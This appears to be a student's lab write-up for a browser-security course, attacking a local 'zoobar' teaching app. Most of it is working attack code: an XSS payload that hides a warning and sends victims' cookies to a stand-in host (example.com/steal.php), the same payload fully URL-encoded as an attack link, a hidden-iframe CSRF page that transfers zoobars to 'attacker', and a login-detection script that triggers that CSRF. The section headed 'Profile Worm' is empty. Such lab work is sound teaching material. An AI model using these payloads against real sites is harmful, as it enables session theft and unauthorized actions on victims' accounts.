##Browser security

###Exercise 1: Cookie Theft

The payload for the exercise consists from several parts:

    <script>
    document.addEventListener("DOMContentLoaded", theDomHasLoaded, false); //Wait that DOM has loaded in the page so we modify the warning text message class
    function theDomHasLoaded(e) { 
    document.getElementsByClassName("warning")[0].style.visibility = 'hidden'; // this hides the red warning message from the page
    } 
    new Image().src = 'http://example.com/steal.php?cookies=' + encodeURIComponent(document.cookie); //this is the payload to steal the victims cookie
    </script>

Finally we URL encode the whole payload and include it as part of the URL. The payload also requires that we include ""> and </ in the beginning and the end so that the exploit works properly.

    ""><script>document.addEventListener("DOMContentLoaded", theDomHasLoaded, false);function theDomHasLoaded(e) { document.getElementsByClassName("warning")[0].style.visibility = 'hidden';} new Image().src = 'http://example.com/steal.php?cookies=' + encodeURIComponent(document.cookie);</script></
    
localhost:8080/zoobar/index.cgi/users?user=admin%22%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%61%64%64%45%76%65%6e%74%4c%69%73%74%65%6e%65%72%28%22%44%4f%4d%43%6f%6e%74%65%6e%74%4c%6f%61%64%65%64%22%2c%20%74%68%65%44%6f%6d%48%61%73%4c%6f%61%64%65%64%2c%20%66%61%6c%73%65%29%3b%66%75%6e%63%74%69%6f%6e%20%74%68%65%44%6f%6d%48%61%73%4c%6f%61%64%65%64%28%65%29%20%7b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%43%6c%61%73%73%4e%61%6d%65%28%22%77%61%72%6e%69%6e%67%22%29%5b%30%5d%2e%73%74%79%6c%65%2e%76%69%73%69%62%69%6c%69%74%79%20%3d%20%27%68%69%64%64%65%6e%27%3b%7d%20%6e%65%77%20%49%6d%61%67%65%28%29%2e%73%72%63%20%3d%20%27%68%74%74%70%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d%2f%73%74%65%61%6c%2e%70%68%70%3f%63%6f%6f%6b%69%65%73%3d%27%20%2b%20%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%3c%2f%73%63%72%69%70%74%3e%3c%2f

###Exercise 2: Cross-Site Request Forgery

Below is provided the HTML and JavaScript code for the CSRF attack that will transfer 10 zoobars from the victim to the user 'attacker' and redirect the victim to other site.

    <html>
    <body>
        <form name="csrf" action="http://localhost:8080/zoobar/index.cgi/transfer" method="POST" target="iframe">
            <input type="hidden" name="zoobars" value="10" />
            <input type="hidden" name="recipient" value="attacker" />
        </form>
        <iframe style="display:none" id="iframe" name="iframe" frameborder="0"></iframe>
        <script> 
            document.getElementById("iframe").onload = function() {
                window.location.href = "http://css.csail.mit.edu/6.858/2014/";
            }
            document.forms[0].submit();
        </script>
    </body>
    </html>

###Exercise 3: Side Channels and Phishing

In this exercise we can retrieve the information from the zoobarjs file to see if the user is logged in or not. If user is logged in the file will include information about how many zoobars the user has. We can use this information in conjunction with JavaScript to check if the user, who visits the attackers site is logged in, since we can check if the file returns the amount of zoobars.

    <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
    <script> 
    //if user is logged in transfer users zoobar to the attackers account
        var zoobars = myZoobars || true;
        if (zoobars) {
        location.href = "answer-2.html"; //launch the CSRF attack if user is logged in
        }
    </script>

The answer-2.html file must be located in the same folder as the answer-3.html file so that the CSRF attack works as expected.

###Exercise 4: Profile Worm
